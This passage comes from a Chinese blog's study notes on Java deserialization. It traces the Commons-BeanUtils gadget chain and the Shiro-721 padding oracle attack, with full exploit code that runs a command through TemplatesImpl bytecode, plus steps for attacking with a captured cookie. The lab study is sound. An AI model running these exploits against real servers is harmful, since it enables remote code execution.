class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fileName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fileName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line"></span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"><span class="comment">//这个add里的数值要注意一下，必须传的是string类型，不然会报错</span></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        serialize(queue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里和上面常规的cb链不同的是   </p><p><img src="../images/image-20230620154157363.png" alt="image-20230620154157363"></p><p>将这里进行了修改  因为就是如果不修改的话会报错</p><p><img src="../images/image-20230620154306119.png" alt="image-20230620154306119"></p><p>就是会报这个错误</p><p><img src="../images/image-20230620154552684.png" alt="image-20230620154552684"></p><p>然后就解决了这个问题，就可以成功进行恶意代码执行了</p><p><img src="../images/image-20230620154446944.png" alt="image-20230620154446944"></p><p><a href="http://arsenetang.com/2022/03/10/Java%E7%AF%87%E4%B9%8B%E5%88%A9%E7%94%A8CB%E9%93%BE%E6%94%BB%E5%87%BBshiro/#The-first-%E6%8A%A5%E9%94%99">Shiro中常见的三种错误 </a>    <strong>在复现shiro的过程中如果遇到问题可以来看看这里  基本都能得到解决</strong></p><h2 id="Shiro-721反序列化漏洞"><a href="#Shiro-721反序列化漏洞" class="headerlink" title="Shiro-721反序列化漏洞"></a>Shiro-721反序列化漏洞</h2><p><a href="https://goodapple.top/archives/261">参考文章</a>   </p><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在Shiro721漏洞中，由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle Attack来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p><p>虽然使用Padding Oracle Attack<strong>可以绕过密钥直接构造攻击密文</strong>，但是在进行攻击之前我们需要获取一个合法用户的Cookie。</p><h3 id="漏洞流程"><a href="#漏洞流程" class="headerlink" title="漏洞流程"></a>漏洞流程</h3><ul><li>登录网站获取合法Cookie</li><li>使用rememberMe字段进行Padding Oracle Attack，获取intermediary</li><li>利用intermediary构造出恶意的反序列化密文作为Cookie</li><li>使用新的Cookie请求网站执行攻击</li></ul><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li><strong>Shiro  &lt;=1.4.1</strong></li></ul><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>将<code>shrio-550</code>的的版本换掉就行</p><p><img src="../images/image-20230620163656141.png" alt="image-20230620163656141"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="密钥分析"><a href="#密钥分析" class="headerlink" title="密钥分析"></a>密钥分析</h4><p><img src="../images/image-20230620163758041.png" alt="image-20230620163758041"></p><p>跟进<code>generateNewKey</code>()</p><p><img src="../images/image-20230620163822678.png" alt="image-20230620163822678"></p><p>在接着跟进<code>generateNewKey</code></p><p><img src="../images/image-20230620163850243.png" alt="image-20230620163850243"></p><p>然后接着跟进<code>init</code></p><p><img src="../images/image-20230620163925489.png" alt="image-20230620163925489"></p><p>在接着跟进<code>init</code></p><p><img src="../images/image-20230620163954395.png" alt="image-20230620163954395"></p><p><img src="../images/image-20230620164051151.png" alt="image-20230620164051151"></p><p>获取完新的key之后，回到这里进行编码</p><p><img src="../images/image-20230620164134997.png" alt="image-20230620164134997"></p><p><img src="../images/image-20230620164158552.png" alt="image-20230620164158552"></p><p>加密方法还是<code>AES</code></p><p><img src="../images/image-20230620164246098.png" alt="image-20230620164246098"></p><p>最后跟进这个<code>setCipherKey</code>   就是将新生成的key来作为加密和解密的key</p><p><strong>至此就是Shiro721完整的密钥生成过程。</strong></p><h4 id="布尔条件"><a href="#布尔条件" class="headerlink" title="布尔条件"></a>布尔条件</h4><p>我们知道，Padding Oracle Attack攻击是一种类似于sql盲注的攻击，这就要求服务器端有能够被我们利用的布尔条件。在<a href="https://goodapple.top/2022/01/06/6db157fde87a6bae/">CBC字节翻转攻击&amp;Padding Oracle Attack原理解析</a>这篇文章中，我们模拟的服务器环境如下</p><ul><li>当收到一个有效的密文（一个被正确填充并包含有效数据的密文）时，应用程序正常响应（200 OK）</li><li>当收到无效的密文时（解密时填充错误的密文），应用程序会抛出加密异常（500 内部服务器错误）</li><li>当收到一个有效密文（解密时正确填充的密文）但解密为无效值时，应用程序会显示自定义错误消息 (200 OK)</li></ul><p>我们可以通过响应头来判断明文填充是否正确，进而爆破出中间值。那么对于解密不正确的Cookie，Shiro是怎么处理的呢？</p><p>(<strong>这里的话<code>Padding Oracle Attack</code>就不详细分析了，只讲结论</strong>)</p><ul><li><strong>Padding正确，服务器正常响应</strong></li><li><strong>Padding错误，服务器返回<code>Set-Cookie: rememberMe=deleteMe</code></strong></li></ul><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在Shiro550中，我们可以直接通过硬编码密钥直接生成攻击密文。但是Shiro721使用了动态密钥，无法直接获取密钥。但是仍然可以通过Padding Oracle Attack绕过密钥，直接生成攻击密文。</p><p>利用链和Shiro550类似，这里我们使用<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/tag/v2.51">ShiroExploit.V2.51</a>工具进行攻击测试。输入测试网址以及登录用户的Cookie</p><p><strong>然后就可以利用工具进行测试了</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; &#x27;C:\Program Files\Java\jdk1.8.0_202\bin\java.exe&#x27; -jar .\ShiroExploit.jar</span><br></pre></td></tr></table></figure><p><strong>这是我的启动方式  (因为环境变量是17，用不了)</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> java-shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-Commons-BeanUtils</title>
      <link href="/posts/f52590e9.html"/>
      <url>/posts/f52590e9.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.viewofthai.link/2022/04/17/apache-commons-beanutils-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90-%EF%BC%88cb%E9%93%BE%EF%BC%89-%E5%AD%A6%E4%B9%A0/">参考文章</a></p><p>最近就是想把不会的链子都跟一遍，现在就先打<code>cb</code>链入手</p><p><strong>全称</strong>(<code>Apache Commons BeanUtils</code>)</p><p>这个链子还可以用来打<code>shiro</code>无依赖的链子</p><p>这个类可以任意触发<code>getter</code>和<code>setter</code>方法</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20220416150822209.png" alt="img"></p><h2 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h2><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.sun.xml.internal.ws.policy.sourcemodel.wspolicy.XmlToken.Name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">person</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;catalina&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">person</span> <span class="variable">person1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">person</span>();</span><br><span class="line">        System.out.println(PropertyUtils.getProperty(person1, <span class="string">&quot;name&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230618182435313.png" alt="image-20230618182435313"></p><p>成功触发</p><p><strong>先打个断点</strong></p><p><img src="../images/image-20230618182504133.png" alt="image-20230618182504133"></p><p>跟进<code>getProperty</code></p><p><img src="../images/image-20230618182536490.png" alt="image-20230618182536490"></p><p>接着跟进<code>getProperty</code></p><p><img src="../images/image-20230618182605765.png" alt="image-20230618182605765"></p><p>然后跟进<code>getNestedProperty</code></p><p><img src="../images/image-20230618183006965.png" alt="image-20230618183006965"></p><p>(<strong>前面的判断是判断bean是否是Map的实例和name是否被映射或索引了</strong>)</p><p>然后全不是</p><p>然后跟进<code>getSimpleProperty</code></p><p><img src="../images/image-20230618183254070.png" alt="image-20230618183254070"></p><p><img src="../images/image-20230618183329271.png" alt="image-20230618183329271"></p><p>然后经过这个<code>getPropertyDescriptor</code>方法</p><p>可以看到，我们传入的是 <code>name</code> ，这里返回 <code>Bean</code> 属性值是 <code>Name</code> ，并且 <code>set</code> 方法与 <code>get</code> 方法都是 <code>setName</code> , <code>getName</code> ，这是 <code>JavaBean</code> 的命名格式，会将传进来的小写<strong>首字母大写</strong></p><p>(<strong>这是一种特性  不能直接传大写的属性  这样的会报错</strong>)</p><p><img src="../images/image-20230618183809387.png" alt="image-20230618183809387"></p><p>接着跟进这个<code>invokeMethod</code>方法</p><p><img src="../images/image-20230618183841914.png" alt="image-20230618183841914"></p><p>最后就会在这个进行调用  </p><p>结束</p><p>这就是<code>cb</code>链调用任意<code>getter</code>的流程</p><p><strong>这里注意的一点就是</strong></p><p><img src="../images/image-20230618184101138.png" alt="image-20230618184101138"></p><p>在传参的时候，虽然函数名是大写的<code>Name</code>,我们也不能直接传大写的(<strong>这是java bean的特性</strong>)   <strong>他会在触发invoke的途中帮我们修改过来</strong></p><p>这就是他调用任意<code>getter</code>的过程</p><p><strong>那么我们可以猜想到哪条链子可以配这cb链来使用呢</strong></p><p>这里的话刚好有个类可以办到</p><p><strong>TemplatesImpl类-&gt;调用恶意类</strong>    <strong>就是这个类，最后会调用动态类加载来执行恶意代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl--&gt;getOutputProperties()</span><br><span class="line">TemplatesImpl--&gt;newTransformer()</span><br><span class="line">        TemplatesImpl--&gt;getTransletInstance()</span><br><span class="line">            TemplatesImpl--&gt;defineTransletClasses()</span><br><span class="line">                TemplatesImpl--&gt;defineClass()</span><br></pre></td></tr></table></figure><p>这里的<code>getOutputProperties</code>()刚好可以通过<code>cb</code>链来触发</p><p><strong>exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object target, String name, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> target.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(target,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = &#123;code&#125;;</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytecodes);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        System.out.println(PropertyUtils.getProperty(templates, <span class="string">&quot;outputProperties&quot;</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230618195517461.png" alt="image-20230618195517461"></p><p>成功执行</p><p><strong>注意因为之前说的 <code>JavaBean</code> 特性， <code>OutputProperties</code> 首字母要小写</strong></p><p>接下来我们就得想办法看谁能触发这个了<code>PropertyUtils.getProperty</code></p><p> <code>BeanComparator.compare</code> 这个类刚好可以办到</p><p><img src="../images/image-20230618200112993.png" alt="image-20230618200112993"></p><p>并且<code>this.property</code>这个属性的值还可控</p><p><img src="../images/image-20230618200225030.png" alt="image-20230618200225030"></p><p><img src="../images/image-20230618200323289.png" alt="image-20230618200323289"></p><p><strong>那么最后一步就差个反序列化<code>readobject</code>()入口</strong>了   </p><p>就是找哪个类的<code>readobject</code>()方法能触发这个<code>compare</code>方法了</p><p>最后在以前的<code>cc4</code>利用链找到了</p><p><img src="../images/image-20230618200609016.png" alt="image-20230618200609016"></p><p>刚好在<code>PriorityQueue</code>这个类里的<code>readobject</code>()方法可以触发<code>compare</code>方法</p><p><img src="../images/image-20230618201614588.png" alt="image-20230618201614588"></p><p>并且这个<code>comparator</code>可控，所以传参为<code>BeanComparator</code>就行了</p><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span 